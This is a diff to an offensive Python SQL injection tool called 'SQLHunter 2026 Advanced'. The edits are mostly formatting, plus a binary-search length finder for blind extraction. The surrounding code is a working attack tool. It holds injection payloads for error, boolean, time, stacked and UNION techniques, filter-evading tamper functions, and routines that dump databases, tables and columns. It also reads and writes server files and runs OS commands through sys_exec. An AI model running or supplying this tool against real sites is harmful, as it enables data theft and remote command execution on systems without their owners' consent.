@@ -15,7 +15,7 @@ import json
 import os
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 
-# ANSI Colors
+# ========== ANSI COLORS ==========
 class Colors:
     RESET = '\033[0m'
     BOLD = '\033[1m'
@@ -41,13 +41,13 @@ def print_banner():
 {Colors.RED}  [!] For authorized educational use only{Colors.RESET}
 """)
 
-def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
+def log_info(msg):    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
 def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")
-def log_error(msg): print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")
+def log_error(msg):   print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")
 def log_warning(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
 def log_payload(msg): print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")
 
-# Configuration
+# ========== CONFIGURATION ==========
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
@@ -72,7 +72,7 @@ def make_request(url, method="GET", data=None, headers=None):
         except: time.sleep(1)
     return None
 
-# Tamper Scripts
+# ========== TAMPER SCRIPTS ==========
 def tamper_space2comment(payload): return payload.replace(" ", "/**/")
 def tamper_random_case(payload): return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
 def tamper_hex_encode(payload): return payload.replace("'", "0x27").replace('"', "0x22")
@@ -85,7 +85,7 @@ TAMPERS = {
     "double_encode": tamper_double_encode
 }
 
-# Main SQLHunter Class
+# ========== SQLHunter CLASS ==========
 class SQLHunter:
     def __init__(self, url, param, method="GET", data=None, tamper=None):
         self.url = url
@@ -147,7 +147,7 @@ class SQLHunter:
             time.sleep(0.2)
         return sum(times) / len(times)
 
-    # Detection Methods
+    # ---------- DETECTION ----------
     def detect_error_based(self):
         log_info("Testing Error-based SQLi...")
         payloads = ["'", "\"", "')", "\")", "' OR '1'='1"]
@@ -161,14 +161,10 @@ class SQLHunter:
                 for err in errors:
                     if re.search(err, content):
                         log_success(f"Error-based with: {pl}")
-                        self.technique = "Error-based"
-                        self.vulnerable = True
-                        return True
+                        self.technique = "Error-based"; self.vulnerable = True; return True
                 if resp.status_code == 500:
                     log_success(f"Error-based (500) with: {pl}")
-                    self.technique = "Error-based"
-                    self.vulnerable = True
-                    return True
+                    self.technique = "Error-based"; self.vulnerable = True; return True
             time.sleep(DELAY)
         return False
 
@@ -181,9 +177,7 @@ class SQLHunter:
         if resp_true and resp_false:
             if abs(len(resp_true.text) - len(resp_false.text)) > 50:
                 log_success("Boolean blind detected.")
-                self.technique = "Boolean-based blind"
-                self.vulnerable = True
-                return True
+                self.technique = "Boolean-based blind"; self.vulnerable = True; return True
         return False
 
     def detect_time_blind(self):
@@ -195,9 +189,7 @@ class SQLHunter:
             elapsed = time.time() - start
             if elapsed > 2.5:
                 log_success(f"Time blind ({elapsed:.2f}s) with: {pl}")
-                self.technique = "Time-based blind"
-                self.vulnerable = True
-                return True
+                self.technique = "Time-based blind"; self.vulnerable = True; return True
             time.sleep(DELAY)
         return False
 
@@ -208,9 +200,7 @@ class SQLHunter:
         self._send(pl)
         if time.time() - start > 0.8:
             log_success("Stacked queries possible.")
-            self.technique = "Stacked queries"
-            self.vulnerable = True
-            return True
+            self.technique = "Stacked queries"; self.vulnerable = True; return True
         return False
 
     def detect_union(self):
@@ -219,8 +209,7 @@ class SQLHunter:
             pl = f" ORDER BY {i}-- -"
             resp = self._send(pl)
             if resp and resp.status_code == 500:
-                self.col_count = i - 1
-                break
+                self.col_count = i - 1; break
             time.sleep(DELAY)
         if self.col_count == 0: return False
         log_info(f"Columns: {self.col_count}")
@@ -232,9 +221,7 @@ class SQLHunter:
             if resp and "SQLHUNTER" in resp.text:
                 self.visible_col = i
                 log_success(f"UNION visible column {i}")
-                self.technique = "UNION query"
-                self.vulnerable = True
-                return True
+                self.technique = "UNION query"; self.vulnerable = True; return True
             time.sleep(DELAY)
         return False
 
@@ -245,7 +232,7 @@ class SQLHunter:
         log_error("No vulnerability found.")
         return False
 
-    # UNION Exploitation
+    # ---------- UNION EXPLOITATION ----------
     def union_query(self, query):
         if not self.visible_col: return None
         nulls = ["NULL"] * self.col_count
@@ -307,7 +294,7 @@ class SQLHunter:
         if res: return res
         return self.union_query(f"SELECT do_system('{cmd}')")
 
-    # Boolean Blind Extraction
+    # ---------- BLIND EXTRACTION (BINARY SEARCH) ----------
     def _blind_bool_true(self, condition):
         pl = f" AND ({condition})-- -"
         resp = self._send(pl, use_tamper=False)
@@ -320,21 +307,37 @@ class SQLHunter:
         return (time.time() - start) > (self.baseline_time + 1.5)
 
     def blind_extract_string(self, query, technique="boolean", max_len=50):
+        """Extract string using blind technique with binary search for length."""
         if technique == "boolean":
             check = self._blind_bool_true
         else:
             check = self._blind_time_true
-        
-        # Get length
+
+        # Binary search for length
+        low, high = 1, max_len
         length = 0
-        for l in range(1, max_len+1):
-            if check(f"LENGTH(({query}))={l}"):
-                length = l
-                break
+        log_info("Finding length with binary search...")
+        while low <= high:
+            mid = (low + high) // 2
+            if check(f"LENGTH(({query}))>={mid}"):
+                length = mid
+                low = mid + 1
+            else:
+                high = mid - 1
             time.sleep(DELAY)
-        if length == 0: return ""
+
+        if length == 0:
+            log_error("Length is 0 or condition failed.")
+            return ""
+
+        # Verify exact length
+        if not check(f"LENGTH(({query}))={length}"):
+            log_error("Failed to confirm exact length, trying to adjust...")
+            for test_len in range(max(1, length-2), min(max_len, length+3)):
+                if check(f"LENGTH(({query}))={test_len}"):
+                    length = test_len; break
+
         log_info(f"Length: {length}")
-        
         result = ""
         for pos in range(1, length+1):
             low, high = 32, 126
@@ -346,7 +349,7 @@ class SQLHunter:
                     high = mid - 1
                 time.sleep(DELAY/2)
             result += chr(low)
-            sys.stdout.write(f"\r{Colors.CYAN}Blind:{Colors.RESET} {result.ljust(length, '.')}")
+            sys.stdout.write(f"\r{Colors.CYAN}Blind Extraction:{Colors.RESET} {result.ljust(length, '.')}")
             sys.stdout.flush()
         print()
         return result
@@ -355,7 +358,7 @@ class SQLHunter:
         dbs = []
         for i in range(10):
             db = self.blind_extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}", technique, 20)
-            if db: dbs.append(db)
+            if db: dbs.append(db); log_success(f"DB: {db}")
             else: break
         return dbs
 
@@ -363,7 +366,7 @@ class SQLHunter:
         tables = []
         for i in range(50):
             t = self.blind_extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {i}", technique, 30)
-            if t: tables.append(t)
+            if t: tables.append(t); log_success(f"Table: {t}")
             else: break
         return tables
 
@@ -371,7 +374,7 @@ class SQLHunter:
         cols = []
         for i in range(50):
             c = self.blind_extract_string(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT 1 OFFSET {i}", technique, 30)
-            if c: cols.append(c)
+            if c: cols.append(c); log_success(f"Col: {c}")
             else: break
         return cols
 
@@ -383,7 +386,7 @@ class SQLHunter:
             else: break
         return data
 
-# Interactive Shell
+# ========== INTERACTIVE SHELL ==========
 def interactive_shell(hunter):
     technique = "time" if hunter.technique == "Time-based blind" else "boolean"
     while True:
@@ -403,14 +406,14 @@ def interactive_shell(hunter):
 0. Exit
 """)
         choice = input(f"{Colors.YELLOW}> {Colors.RESET}").strip()
-        
+
         if choice == "1":
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                 dbs = hunter.get_databases()
             else:
                 dbs = hunter.blind_get_databases(technique)
             for d in dbs: print(f"  {d}")
-        
+
         elif choice == "2":
             db = input("Database: ").strip()
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
@@ -418,7 +421,7 @@ def interactive_shell(hunter):
             else:
                 tables = hunter.blind_get_tables(db, technique)
             for t in tables: print(f"  {t}")
-        
+
         elif choice == "3":
             db = input("Database: ").strip()
             table = input("Table: ").strip()
@@ -427,7 +430,7 @@ def interactive_shell(hunter):
             else:
                 cols = hunter.blind_get_columns(db, table, technique)
             for c in cols: print(f"  {c}")
-        
+
         elif choice == "4":
             db = input("Database: ").strip()
             table = input("Table: ").strip()
@@ -442,7 +445,7 @@ def interactive_shell(hunter):
                     col = input(f"Column ({', '.join(cols)}): ").strip()
                     data = hunter.blind_dump_column(db, table, col, technique)
                     for val in data: print(f"  {val}")
-        
+
         elif choice == "5":
             query = input("Query: ").strip()
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
@@ -450,7 +453,7 @@ def interactive_shell(hunter):
             else:
                 result = hunter.blind_extract_string(query, technique)
             print(f"Result: {result}")
-        
+
         elif choice == "6":
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                 path = input("File path: ").strip()
@@ -458,14 +461,14 @@ def interactive_shell(hunter):
                 if content: print(content)
                 else: log_error("Failed or no privilege.")
             else: log_error("Requires UNION technique.")
-        
+
         elif choice == "7":
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                 path = input("Destination path: ").strip()
                 content = input("Content: ").strip()
                 hunter.write_file(path, content)
             else: log_error("Requires UNION technique.")
-        
+
         elif choice == "8":
             if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                 cmd = input("Command: ").strip()
@@ -473,18 +476,17 @@ def interactive_shell(hunter):
                 if out: print(out)
                 else: log_error("No output or sys_exec missing.")
             else: log_error("Requires UNION technique.")
-        
+
         elif choice == "9":
             technique = "time" if technique == "boolean" else "boolean"
             log_info(f"Switched to {technique}-based extraction.")
-        
+
         elif choice == "0":
             break
-        
         else:
             log_error("Invalid choice.")
 
-# Main
+# ========== MAIN ==========
 def main():
     parser = argparse.ArgumentParser(description="SQLHunter 2026 Advanced")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
@@ -513,7 +515,7 @@ def main():
         log_info(f"Testing parameter '{param}'")
         hunter = SQLHunter(args.url, param, method="POST" if args.data else "GET", data=args.data, tamper=args.tamper)
         if not hunter.run_detection(): continue
-        
+
         log_success(f"Vulnerable! Technique: {hunter.technique}")
 
         if args.file_read and hunter.technique in ["UNION query","Error-based"]:
